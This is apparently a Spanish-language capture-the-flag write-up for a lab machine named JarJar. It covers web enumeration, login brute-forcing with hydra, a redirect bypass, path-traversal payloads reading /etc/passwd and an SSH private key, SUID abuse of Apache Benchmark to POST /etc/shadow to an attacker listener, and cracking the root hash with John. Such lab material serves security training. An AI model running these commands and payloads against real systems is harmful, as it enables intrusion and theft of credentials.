# JarJar

### Fase de Reconocimiento y Descubrimiento (Enumeración)

### Escaneo de Puertos (Nmap)
Realizamos un escaneo de puertos inicial con nmap para identificar los servicios activos en la máquina objetivo:

![Pasted image 20260821172547.png](../../../assets/Pasted%20image%2020260821172547.png)

**Servicios identificados:**
* **Puerto 22/TCP (SSH):** Servicio OpenSSH para acceso remoto por terminal. Ver teoría en [SSH.md](../../../Pentesting%20Notes/1_Enumeration/SSH.md).
* **Puerto 80/TCP (HTTP):** Servidor web Apache httpd 2.4.61 en ejecución. Ver teoría en [HTTP & HTTPS.md](../../../Pentesting%20Notes/1_Enumeration/HTTP%20%26%20HTTPS.md).

* **Resolución de Nombres:** Para interactuar adecuadamente con los servicios virtuales del servidor, añadimos el dominio `jarjar.nyx` a nuestro archivo `/etc/hosts`:

```text
192.168.1.X jarjar.nyx
```

---

## Enumeración Web y de Servicios

### Inspección del Servidor Web (WhatWeb y Virtual Hosting)
Analizamos las tecnologías y cabeceras del servidor web mediante `whatweb`:

![Pasted image 20260821172751.png](../../../assets/Pasted%20image%2020260821172751.png)

Identificamos Apache 2.4.61, PHP 8.2.20 y una versión desactualizada de jQuery. Al evaluar la navegación encontramos dos comportamientos diferenciados según la cabecera `Host`:

1. **Acceso directo por dirección IP:** El servidor muestra una página genérica con un video de fondo. La inspección de su código fuente no revela recursos ni datos de interés:

![Pasted image 20260821172950.png](../../../assets/Pasted%20image%2020260821172950.png)

2. **Acceso mediante el dominio `http://jarjar.nyx`:** El servidor responde con el sitio corporativo principal, el cual cuenta con varias secciones y un panel de autenticación:

![Pasted image 20260821172900.png](../../../assets/Pasted%20image%2020260821172900.png)

Al explorar el sitio localizamos el formulario de inicio de sesión (`/login.php`):

![Pasted image 20260821173131.png](../../../assets/Pasted%20image%2020260821173131.png)

### Fuzzing de Directorios Web (ffuf y dirsearch)
Realizamos fuzzing de rutas y recursos web mediante `ffuf` para descubrir directorios y archivos ocultos:

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -u "http://jarjar.nyx/FUZZ" -c -ic -fc 403 -e .php,.txt,.py,.js,.bak,.html,.json
```

![Pasted image 20260821173323.png](../../../assets/Pasted%20image%2020260821173323.png)

De manera complementaria, ejecutamos `dirsearch` contra la raíz del sitio web:

```bash
dirsearch -u http://jarjar.nyx/
```

Ver guía y opciones avanzadas en [Fuzzing Cheat Sheet](../../../Pentesting%20Notes/Web/Fuzzing/Cheat%20Sheet.md).

![Pasted image 20260821173448.png](../../../assets/Pasted%20image%2020260821173448.png)

Procedemos a inspeccionar los archivos descubiertos con código de estado **200 OK**:

* **`about.php`:**

![Pasted image 20260821173558.png](../../../assets/Pasted%20image%2020260821173558.png)

* **`header.php`:**

![Pasted image 20260821173722.png](../../../assets/Pasted%20image%2020260821173722.png)

* **`config.php`:** Archivo PHP vacío en la respuesta HTTP (procesamiento backend sin salida directa).
* **`contact.php`:**

![Pasted image 20260821173859.png](../../../assets/Pasted%20image%2020260821173859.png)

* **`admin.php`:** Panel de administración protegido por redirección.

---

### Análisis de Autenticación y Enumeración de Usuarios
Interceptamos la petición de login hacia `/login.php` mediante Burp Suite:

![Pasted image 20260821174432.png](../../../assets/Pasted%20image%2020260821174432.png)

Se descarta inyección SQL inicial tras probar distintos vectores. Procedemos a evaluar nombres de usuario potenciales extraídos de la temática del sitio web (`hansolo`, `luke`, `leia`, `jarjar`, `obiwan`).

* **Vulnerabilidad de Enumeración de Usuarios (Respuesta Diferencial):**
  * Al ingresar el usuario **`jarjar`**, el servidor responde con el mensaje específico: **`Invalid Password`**:

![Pasted image 20260821180531.png](../../../assets/Pasted%20image%2020260821180531.png)

  * Al ingresar cualquier otro usuario no existente, la respuesta es genérica: **`Invalid username or Password`**.

Esto confirma la existencia del usuario **`jarjar`** en el sistema. Probamos un ataque de fuerza bruta contra el formulario utilizando `hydra`:

```bash
hydra -l jarjar -P /usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt jarjar.nyx http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid Password" -t 4 -V -f -I
```

El ataque de fuerza bruta web no produce resultados inmediatos dentro del diccionario.

---

### Análisis del Panel Administrativo (admin.php) y Flujo de Redirección (302 Bypass)
Al solicitar directamente el recurso `GET /admin.php`, el servidor emite una cabecera de redirección **302 Found**. Sin embargo, el script PHP no finaliza la ejecución tras enviar la cabecera (vulnerabilidad *Execution After Redirect* / EAR), por lo que el cuerpo completo del panel administrativo es devuelto en la respuesta HTTP:

![Pasted image 20260821181526.png](../../../assets/Pasted%20image%2020260821181526.png)

Interceptando la respuesta con Burp Suite y modificando el código de estado de **302 Found** a **200 OK**, la interfaz administrativa se renderiza de forma íntegra en el navegador:

![Pasted image 20260821181627.png](../../../assets/Pasted%20image%2020260821181627.png)

Dentro de la sección de visualización de logs administrativos, descubrimos un endpoint con paso de parámetros:

```text
http://jarjar.nyx/secure_files_admin/files.php?logs=error.log
```

![Pasted image 20260821181915.png](../../../assets/Pasted%20image%2020260821181915.png)

---

## Fase de Explotación / Intrusión

### Bypass de WAF / Filtro y Local File Inclusion (LFI)
Evaluamos el parámetro `logs` frente a vulnerabilidades de Path Traversal probando diversos esquemas de codificación y secuencias relativas:

* `../../../../etc/passwd`
* `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd`
* `....//....//....//....//etc/passwd`
* `./error.log/../../../../../etc/passwd`

El mecanismo de filtrado / WAF valida que la ruta empiece por el prefijo esperado de logs. Construimos el payload de evasión anteponiendo `./logs/`:

```text
./logs/../../../../etc/passwd
```

Ver técnicas de evasión y payloads en [Path Traversal Cheat Sheet](../../../Pentesting%20Notes/Web/Vulnerabilities/02-Path_Traversal/Cheat%20Sheet.md).

![Pasted image 20260821222223.png](../../../assets/Pasted%20image%2020260821222223.png)

* **Impacto:** Confirmamos la vulnerabilidad de **Local File Inclusion (LFI)** al recuperar el archivo `/etc/passwd`, validando que **`jarjar`** es un usuario con shell interactiva en el sistema.

#### Enumeración del Sistema vía LFI:
1. Los wrappers de PHP (`php://filter`, etc.) se encuentran deshabilitados o bloqueados por el filtro.
2. Los archivos con extensión `.php` son interpretados por el motor PHP sin mostrar código fuente plano.
3. Mediante la lectura de archivos de log identificamos las versiones de la infraestructura del servidor:
   * **Apache:** 2.4.61
   * **PHP:** 8.2.20
   * **MariaDB:** 10.11.6
   * **OpenSSH:** 9.2p1

---

### Extracción de Claves SSH y Acceso Inicial (Usuario jarjar)
Dado que el servicio OpenSSH está activo y el usuario `jarjar` posee directorio home, intentamos recuperar su material criptográfico SSH mediante el vector LFI:

1. **Clave Pública SSH:**
   Consultamos `/home/jarjar/.ssh/id_rsa.pub` confirmando la existencia de claves generadas:

![Pasted image 20260821231712.png](../../../assets/Pasted%20image%2020260821231712.png)

2. **Clave Privada SSH:**
   Consultamos `/home/jarjar/.ssh/id_rsa` y recuperamos la clave privada RSA completa:

![Pasted image 20260821232117.png](../../../assets/Pasted%20image%2020260821232117.png)

Guardamos la clave privada en nuestra máquina local, ajustamos los permisos correspondientes y establecemos conexión SSH:

```bash
chmod 600 id_rsa
ssh -i id_rsa jarjar@jarjar.nyx
```

![Pasted image 20260821232325.png](../../../assets/Pasted%20image%2020260821232325.png)

* **Acceso inicial:** Obtenemos una shell interactiva como el usuario **`jarjar`** y leemos la flag de usuario:

![Pasted image 20260821232257.png](../../../assets/Pasted%20image%2020260821232257.png)

---

### Enumeración de Base de Datos (MariaDB / MySQL)
Con acceso local al sistema, inspeccionamos el archivo `/var/www/html/config.php` para obtener las credenciales de la base de datos MariaDB:

![Pasted image 20260821232921.png](../../../assets/Pasted%20image%2020260821232921.png)

Nos conectamos al servicio local MariaDB y extraemos las credenciales y hashes almacenados de los demás usuarios del portal. Ver teoría de comandos en [MySQL.md](../../../Pentesting%20Notes/1_Enumeration/MySQL.md).

---

## Escalada de Privilegios

### Enumeración Interna y Binario SUID (/usr/bin/ab)
Realizamos una enumeración de binarios con el bit SUID activo en el sistema:

```bash
find / -perm -4000 -type f 2>/dev/null
```

![Pasted image 20260821233213.png](../../../assets/Pasted%20image%2020260821233213.png)

* **Vulnerabilidad de Configuración:** El binario `/usr/bin/ab` (Apache Benchmark) tiene asignados permisos **SUID** con propietario root. Ver teoría en [Linux Privilege Escalation - Permissions.md](../../../Pentesting%20Notes/3_Post-Explotation/Linux%20Privilage%20Escalation/Permissions.md).

### Exfiltración de /etc/shadow con Apache Benchmark (ab)
La utilidad `ab` incluye el parámetro `-p` (*POST file*), el cual permite enviar el contenido de un archivo arbitrario en el cuerpo de una petición HTTP POST. Dado que `ab` corre con privilegios SUID de root, podemos abusar de esta funcionalidad para leer y exfiltrar `/etc/shadow`:

1. En nuestra máquina atacante, nos ponemos en escucha por un puerto TCP (ej. 8001):

```bash
nc -lnvp 8001
```

2. En la máquina objetivo, ejecutamos `ab` apuntando a nuestro listener:

```bash
/usr/bin/ab -p /etc/shadow -T "application/x-www-form-urlencoded" -n 1 -c 1 "http://192.168.1.108:8001/"
```

3. Recibimos la petición HTTP POST en nuestro listener con el volcado íntegro de `/etc/shadow`:

![Pasted image 20260821233944.png](../../../assets/Pasted%20image%2020260821233944.png)

Extraemos el hash del superusuario **`root`**:

```text
root:$y$j9T$06k8CpwIHWwvgOizpHNH30$VTfTBXChehaq8kPRI5Lhh54LIRXdbkoP3ZxOGQaxqZ0
```

---

### Crackeo de Hash Yescrypt y Acceso como Root
El identificador `$y$` indica que el hash utiliza el algoritmo de cifrado **yescrypt**. Procedemos a descifrarlo utilizando **John the Ripper** con el formato `crypt`:

```bash
john --format=crypt --wordlist=/usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt root.txt
```

Ver opciones avanzadas de descifrado en [Password Cracking.md](../../../Pentesting%20Notes/2_Password-Attacks/Password%20Cracking.md).

![Pasted image 20260821235524.png](../../../assets/Pasted%20image%2020260821235524.png)

Una vez recuperada la contraseña en texto claro de root, ejecutamos `su root` en la terminal para elevar privilegios:

```bash
su root
```

![Pasted image 20260821235707.png](../../../assets/Pasted%20image%2020260821235707.png)

* **Control Total:** Obtenemos una shell interactiva con máximos privilegios (`uid=0(root)`) y leemos la flag final de root (`root.txt`).

---

## Relaciones y Conceptos
* **Teoría:** [HTTP & HTTPS.md](../../../Pentesting%20Notes/1_Enumeration/HTTP%20%26%20HTTPS.md), [SSH.md](../../../Pentesting%20Notes/1_Enumeration/SSH.md), [Fuzzing Cheat Sheet](../../../Pentesting%20Notes/Web/Fuzzing/Cheat%20Sheet.md), [Path Traversal Cheat Sheet](../../../Pentesting%20Notes/Web/Vulnerabilities/02-Path_Traversal/Cheat%20Sheet.md), [MySQL.md](../../../Pentesting%20Notes/1_Enumeration/MySQL.md), [Linux Privilege Escalation - Permissions.md](../../../Pentesting%20Notes/3_Post-Explotation/Linux%20Privilage%20Escalation/Permissions.md), [Password Cracking.md](../../../Pentesting%20Notes/2_Password-Attacks/Password%20Cracking.md)
* **Laboratorios Relacionados:** [Patriaquerida](../../../Laboratorios/DockerLabs/Facil/Patriaquerida.md) (Comparte explotación de Path Traversal / LFI y escalada de privilegios mediante binarios SUID), [Bola](../../../Laboratorios/Vulnyx/Medio/Bola.md) (Comparte entorno Vulnyx, resolución por Virtual Hosts y acceso SSH), [Express](../../../Laboratorios/Vulnyx/Medio/Express.md) (Comparte resolución por VHosts y enumeración web)
